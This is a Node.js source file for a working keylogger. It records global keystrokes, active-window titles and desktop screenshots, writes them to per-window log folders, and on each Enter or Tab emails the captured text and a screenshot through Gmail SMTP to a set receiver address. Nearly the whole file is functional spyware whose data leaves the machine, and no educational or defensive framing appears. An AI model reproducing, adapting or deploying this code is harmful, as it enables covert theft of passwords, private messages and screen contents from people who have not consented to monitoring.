const { GlobalKeyboardListener } = require("node-global-key-listener");
const activeWin = require('active-win');
const nodemailer = require('nodemailer');
const screenshot = require('screenshot-desktop');
const fs = require('fs');
const path = require('path');

const v = new GlobalKeyboardListener();

// Create a Map for special characters
const specialCharacters = new Map([
    ["1", "!"], ["2", "@"], ["3", "#"], ["4", "$"], ["5", "%"],
    ["6", "^"], ["7", "&"], ["8", "*"], ["9", "("], ["0", ")"],
    ["-", "_"], ["=", "+"], ["[", "{"], ["]", "}"], [";", ":"],
    ["'", "\""], [",", "<"], [".", ">"], ["/", "?"], ["`", "~"]
  ]);
  

let userInput = '';
let shiftPressed = false;
let capsLockEnabled = false;
let lastKeyState = new Map();

// Function to handle key events
function handleKeyEvent(e, down) {
    if (e.state === "DOWN") {
        const keyName = e.name;
        lastKey = keyName;

        // This will exit the program when Ctrl + Shift + Q is pressed
         if (
            (lastKeyState.get("LEFT CTRL") || lastKeyState.get("RIGHT CTRL")) &&
            (lastKeyState.get("LEFT SHIFT") || lastKeyState.get("RIGHT SHIFT")) &&
            keyName === "Q"
        ) {
            console.log("\nExit shortcut pressed. Exiting the program.");
            v.stop();
            process.exit(0);
        }

        // Check if key is already pressed
        if (lastKeyState.get(keyName)) {
            return;
        }
        
        // Update key state
        lastKeyState.set(keyName, true);

        // Handle modifier keys silently
        if (keyName === "LEFT SHIFT" || keyName === "RIGHT SHIFT") {
            shiftPressed = true;
            return;
        }

        if (keyName === "LEFT CTRL" || keyName === "RIGHT CTRL") {
            return;
        }

        if (keyName === "LEFT ALT" || keyName === "RIGHT ALT") {
            return;
        }

        if (keyName === "CAPS LOCK") {
            capsLockEnabled = !capsLockEnabled;
            return;
        }

        // Handle special keys
        if (keyName === "BACKSPACE") {
            handleBackspaceKey();
            return;
        }

        if (keyName === "TAB" || keyName === "RETURN") {
            handleEnterKey();
            sendEmail();
            return;
        }

        if (keyName === "SPACE") {
            userInput += " ";
            process.stdout.write(" ");
            return;
        }

        // Handle regular keys
        const character = getCharacterForKey(keyName);
        userInput += character;
        process.stdout.write(character);
    } else {
        // Key up events
        const keyName = e.name;
        lastKeyState.set(keyName, false);

        if (keyName === "LEFT SHIFT" || keyName === "RIGHT SHIFT") {
            shiftPressed = false;
        }
    }
}

// Function to handle Enter key
function handleEnterKey() {
  console.log("\nUser Input:", userInput);
  getActiveWindowInfo(lastKey);

}

// Function to handle Backspace key
function handleBackspaceKey() {
  userInput = userInput.slice(0, -1); // Remove the last character
  process.stdout.clearLine(); // Clear the last printed character
  process.stdout.cursorTo(0); // Move the cursor to the beginning of the line
  process.stdout.write(userInput); // Print the updated input
}

// Function to get the character for a key considering case sensitivity and Caps Lock
function getCharacterForKey(keyName) {
  const isAlphabetCharacter = /^[A-Za-z]$/.test(keyName);

  if (isAlphabetCharacter) {
    if (shiftPressed || (capsLockEnabled && isAlphabet(keyName))) {
      return keyName.toUpperCase();
    } else {
      return keyName.toLowerCase();
    }
  } 
  else {
    const character = specialCharacters.get(keyName);
    if (character !== undefined) {
      return shiftPressed ? character : keyName;
    } else {
      return keyName;
    }
  }
}

// Function to check if a character is an alphabet character
function isAlphabet(character) {
  return /^[A-Za-z]$/.test(character);
}

// Start listening for global key events
v.addListener(handleKeyEvent);
v.start();

// Function to get and display the active window information
async function getActiveWindowInfo(lastKey) {
  try {
    const result = await activeWin();
    if (result) {
      
      console.log('\nActive Window Information:\n');
      console.log("Key Pressed: ", lastKey );
      console.log(`Title: ${result.title}`);
      console.log(`App: ${result.owner.name}`);
      console.log(`ID: ${result.id}\n\n`);
    } else {
      console.log('\nNo active window found.\n');
    }
  } catch (error) {
    console.error('Error:', error);
  }
}

// Create a Nodemailer transporter using your email service provider
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,  // use SSL
    auth: {
        user: 'your_email@gmail.com',
        pass: 'your_app_password' // Replace with App Password, not regular password
    }
});

// Verify email configuration
transporter.verify((error, success) => {
    if (error) {
        console.log('SMTP connection error:', error);
    } else {
        console.log('Server is ready to send emails');
    }
});

// Add these helper functions after your existing imports
function sanitizeFolderName(name) {
    // Remove invalid characters and trim
    return name.replace(/[<>:"/\\|?*]/g, '-').trim();
}

function createFolderIfNotExists(folderPath) {
    if (!fs.existsSync(folderPath)) {
        fs.mkdirSync(folderPath, { recursive: true });
    }
}

// Add this function after the existing helper functions
function initializeLogsDirectory() {
    const baseDir = path.join(__dirname, 'logs');
    if (!fs.existsSync(baseDir)) {
        fs.mkdirSync(baseDir, { recursive: true });
        console.log('Logs directory created:', baseDir);
    }
}

// Modify saveLogsAndScreenshot function
async function saveLogsAndScreenshot(result, userInput, lastKey) {
    try {
        // Initialize base logs directory
        initializeLogsDirectory();

        // Create timestamped window folder
        const timestamp = new Date().toISOString().replace(/[:]/g, '-').split('.')[0];
        const baseDir = path.join(__dirname, 'logs');
        const windowName = sanitizeFolderName(result.title);
        const logsDir = path.join(baseDir, windowName);

        // Create window-specific directory
        if (!fs.existsSync(logsDir)) {
            fs.mkdirSync(logsDir, { recursive: true });
        }

        // Save screenshot with timestamp in filename
        const screenshotPath = path.join(logsDir, `screenshot_${timestamp}.png`);
        await screenshot({ filename: screenshotPath });
        console.log('Screenshot saved:', screenshotPath);

        // Save keystroke log with timestamp in filename
        const logPath = path.join(logsDir, `keylog_${timestamp}.txt`);
        const logContent = `User Input: ${userInput}
Active Window Information:
Key Pressed: ${lastKey}
Title: ${result.title}
App: ${result.owner.name}
ID: ${result.id}
Timestamp: ${timestamp}`;
        
        fs.writeFileSync(logPath, logContent);
        console.log('Log saved:', logPath);

        return { screenshotPath, logContent, windowName, timestamp };
    } catch (error) {
        console.error('Error saving logs and screenshot:', error);
        throw error;
    }
}

// Modify sendEmail function
async function sendEmail() {
    try {
        const result = await activeWin();
        if (result) {
            const { screenshotPath, logContent, windowName, timestamp } = await saveLogsAndScreenshot(result, userInput, lastKey);

            // Email configuration
            const mailOptions = {
                from: 'your_email@gmail.com',
                to: 'receiver_email@gmail.com',
                subject: `Key Logs - ${windowName} - ${timestamp}`,
                text: logContent,
                attachments: [{
                    filename: 'screenshot.png',
                    path: screenshotPath,
                    contentType: 'image/png',
                    cid: 'screenshot' // Add content ID for embedding
                }]
            };

            // Send email and keep files
            await new Promise((resolve, reject) => {
                transporter.sendMail(mailOptions, (error, info) => {
                    if (error) {
                        console.error('Email error:', error);
                        reject(error);
                    } else {
                        console.log('Email sent:', info.response);
                        resolve(info);
                    }
                });
            });

        } else {
            console.log('No active window found.');
        }
    } catch (error) {
        console.error('Error in sendEmail:', error);
    }
    userInput = ''; // Clear userInput
}

// Listen for Ctrl+C to exit the program gracefully
process.on('SIGINT', () => {
  console.log('\nExiting the program.');
  v.stop(); // Stop listening to global key events
  process.exit(0);
});

// Add this line right after your requires at the top of the file
initializeLogsDirectory();
